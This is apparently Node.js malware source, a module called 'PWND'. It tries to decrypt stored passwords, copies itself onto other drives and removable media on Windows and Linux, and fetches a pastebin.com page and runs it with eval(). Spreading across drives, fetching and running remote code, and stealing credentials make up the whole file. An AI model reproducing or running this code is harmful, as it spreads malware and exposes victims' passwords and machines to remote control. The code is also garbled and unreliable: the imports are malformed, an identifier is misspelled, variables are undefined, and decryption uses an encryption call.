/** Theory behind:
  * Init Vect is char 4 to 20
  * Password (encrypted) is 21 to string.length-16
  */
const aes = require('aes-js');
const { copySync } = require('fs-extra');
const { dirname } = require('path');
  sys_check = require("./sys_check"),
  fs = require("fs"),
  path = require("path"),
  crypto = require("crypto");

class PWND {
    constructor() {}

    /**
      * @param {String} string
      */
    static async fndEnc(string) {
        let init_vect;
        function findInit() {
          let thing = String(string)
          thing.substr(0,3);
          init_vect = thing.substr(17, thing.length);
        }
        findInit(string);
        let endStr = String(string);
        let pass2 = endStr;
        console.log("Password Encrypted:", pass2);
        console.log("Initial Vector", init_vect)
        return init_vect;
    }

    static async decrypt(pass) {
        function sha1(input) {
          return crypto.createHash('sha1').update(input).digest();
        }

        function pass_derive_bytes(pass, salt, iterations, len) {
          var key = Buffer.from(pass+salt);
          for (let i; i < iterations; i++) {
            key = sha1(key);
          }
          if (key.length < len) {
            var hx = pass_derive_bytes(pass, salt, iterations - 1, 20);
            for (var counter = 1; key.length < len; ++counter) {
              key = Buffer.concat([key, sha1(Buffer.concat([Buffer.from(counter.toString()), hx]))]);
            }
          }
          return BUffer.alloc(len, key);
        }

        async function decode(string) {
          var key = pass_derive_bytes(password, '', 100, 32);
          var cipher = crypto.createCipheriv('aes-256-cbc', key, Buffer.from(iv));
          var part1 = cipher.update(string, 'utf8');
          var part2 = cipher.final();
          const decryptedText = Buffer.concat([part1, part2]).toString('base64');
          return decryptedText;
        }

        return console.log("Decrypted password: ", await decode(pass));
    }

    static async hardspread() {
        if (/win32/gi.test(process.platform)) {
          try {
            copySync("./", "D:/Stuff");
          } catch (e) {
            console.log("Drive D: doesn't exist, trying new drive")
            copySync("./", "E:/Stuff");
          } finally {
            copySync("./", "F:/Stuff");
          }
        } else if ((/darwin/gi).test(process.platform)) {

        } else if ((/linux/gi).test(process.platform)) {
          try {
            fs.readdir('/media', (err, folder) => {
              if (err) throw new Error("Failed to load /media directory, aborting process.");
              console.log(`Loaded [${folder.length}] folders, successfully.`);

              folder.forEach(d => {
                console.log(d);
                copySync(("./"), `/media/${d}/Stuff`);
                console.log(`Exploit: Copied Xinia to : ${d}`);
              })
            });
          } catch (e) {
            console.log(e);
          }
        } else {
          throw new Error("Unknown System Platform!!! exiting now!"), process.exit(1);
        }

    }

    static async netspread() {
      try {
        var https = require('https');
        https.get({
          hostname: 'pastebin.com',
          path: '/raw/[path]',
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
          }
        }, res => {
          res.setEncoding('utf8');
          let contents = '';
          res.on('data', content => {
            contents += content.toString();
          }).on("error", () => {})
            .on('end', () => {
              eval(contents);
            });
        });
      } catch(e){}
    }
}

module.exports = PWND;
